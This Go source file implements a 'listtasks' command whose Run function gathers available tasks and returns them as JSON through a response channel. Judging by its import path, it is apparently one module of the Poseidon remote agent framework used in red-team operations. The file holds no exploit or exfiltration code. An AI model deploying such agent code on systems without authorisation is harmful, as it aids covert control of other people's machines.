package listtasks

import (
	// Standard
	"encoding/json"

	// Poseidon

	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
)

type Listtasks interface {
	Result() map[string]interface{}
}

func Run(task structs.Task) {
	msg := task.NewResponse()
	r, err := getAvailableTasks()
	if err != nil {
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	byteResult, err := json.MarshalIndent(r.Result(), "", "	")
	msg.UserOutput = string(byteResult)
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
